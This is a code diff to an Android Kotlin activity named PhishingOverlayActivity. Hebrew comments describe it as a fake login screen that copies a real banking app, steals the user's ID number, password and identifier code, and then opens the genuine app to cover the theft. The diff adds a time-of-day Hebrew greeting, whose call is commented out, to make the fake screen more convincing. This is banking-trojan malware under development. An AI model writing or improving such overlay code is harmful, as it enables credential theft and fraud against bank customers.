@@ -13,9 +13,14 @@ import android.text.TextWatcher
 import android.util.Log
 import android.widget.Button
 import android.widget.EditText
+import android.widget.TextView
 import android.widget.Toast
 import androidx.core.content.ContextCompat
+import java.util.*
 
+//חיקוי מסך התחברות - מציגה ממשק זהה לאפליקציית הבנק האמיתית
+//גניבת קרדנציאלס - אוספת תעודת זהות, סיסמה וקוד מזהה
+//העברה לאפליקציה האמיתית - לאחר גניבת הנתונים, פותחת את האפליקציה האמיתית
 class PhishingOverlayActivity : Activity() {
 
     // Regex patterns
@@ -32,6 +37,9 @@ class PhishingOverlayActivity : Activity() {
 
         // טוענים את הממשק
         setContentView(R.layout.phishing_login_overlay)
+
+        // קביעת ברכה לפי השעה
+        //setDynamicGreeting()
 
         // מוצאים את הרכיבים
         val idField = findViewById<EditText>(R.id.id_field)
@@ -159,6 +167,21 @@ class PhishingOverlayActivity : Activity() {
         }
 
         return allOk
+    }
+
+    private fun setDynamicGreeting() {
+        val greetingText = findViewById<TextView>(R.id.greeting_text)
+        val calendar = Calendar.getInstance()
+        val hour = calendar.get(Calendar.HOUR_OF_DAY)
+
+        val greeting = when (hour) {
+            in 5..11 -> "בוקר טוב"
+            in 12..17 -> "צהריים טובים"
+            in 18..23, in 0..4 -> "ערב טוב"
+            else -> "ערב טוב"
+        }
+
+        greetingText.text = greeting
     }
 
     override fun onBackPressed() {
